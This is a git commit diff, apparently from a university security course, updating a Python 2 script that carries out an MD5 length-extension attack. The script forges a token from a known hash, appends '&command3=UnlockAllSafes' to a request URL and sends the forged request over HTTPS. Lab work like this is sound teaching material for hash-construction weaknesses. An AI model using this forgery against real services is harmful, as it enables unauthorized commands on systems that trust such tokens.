82529d6b18146a672f998c5a676539d860223c79
Josh Rehm <jrehm135@vt.edu>
2018-08-30 16:47:44 -0400

    fixed http problem

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -4,18 +4,28 @@ import urllib
 
 url = sys.argv[1]
 
-length_of_m = 52
+length_of_m = 76
 m_bits = (length_of_m + len(padding(length_of_m * 8)))* 8
 
 h = md5(state="402a574d265dc212ee64970f159575d0".decode("hex"), count=m_bits)
 
-parsedUrl = urlparse.urlparse(url)
-
-parsedstring = urllib.quote(parsedUrl)
-
 x = "&command3=UnlockAllSafes"
 h.update(x)
-print h.hexdigest()
+# print h.hexdigest()
+
+tokenLoc = url.find("402a574d265dc212ee64970f159575d0")
+endLoc = url.find("&user=admin&command1=ListFiles&command2=NoOp")
+updatedURL = url[:tokenLoc] + h.hexdigest() + url[endLoc:] + x
+
+urllen1 = "________" + url[endLoc:] + x
+urllen2 = len(urllen1)
+
+print urllen1
+print urllen2
+
+print updatedURL
+
+parsedUrl = urlparse.urlparse(updatedURL)
 
 conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
